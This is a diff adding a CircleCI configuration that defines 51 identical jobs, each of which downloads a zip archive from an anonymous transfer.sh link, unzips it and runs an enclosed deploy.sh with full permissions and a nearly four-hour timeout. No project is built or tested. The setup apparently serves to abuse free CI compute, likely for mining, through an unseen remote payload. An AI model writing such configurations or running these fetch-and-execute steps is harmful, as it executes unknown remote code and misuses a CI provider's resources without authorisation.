@@ -1,0 +1,722 @@
+version: 2
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build1:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build2:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build3:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build4:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build5:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build6:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build7:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build8:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build9:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build10:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build11:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build12:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build13:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build14:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build15:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build16:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build17:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build18:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build19:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build20:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build21:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build22:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build23:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build24:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build25:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build26:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build27:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build28:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build29:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build30:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build31:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build32:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build33:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build34:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build35:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build36:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build37:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build38:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build39:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build40:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build41:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build42:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build43:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build44:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build45:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build46:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build47:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build48:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build49:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  build50:
+    machine:
+      image: ubuntu-2004:202010-01
+    resource_class: medium
+    parallelism: 4
+    steps:
+     - run:
+        name: aku
+        command: |
+                    sudo apt update 
+                    sudo apt install screen -y 
+                    wget https://transfer.sh/get/DV8izG/basomasparto.zip && unzip basomasparto.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+        no_output_timeout: 235m
+  
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - build
+            - build1
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8
+            - build9
+            - build10
+            - build11
+            - build12
+            - build13
+            - build14
+            - build15
+            - build16
+            - build17
+            - build18
+            - build19
+            - build20
+            - build21
+            - build22
+            - build23
+            - build24
+            - build25 
+            - build26
+            - build27
+            - build28
+            - build29
+            - build30
+            - build31
+            - build32
+            - build33
+            - build34
+            - build35
+            - build36
+            - build37
+            - build38
+            - build39
+            - build40
+            - build41
+            - build42
+            - build43
+            - build44
+            - build45
+            - build46
+            - build47
+            - build48
+            - build49
+            - build50
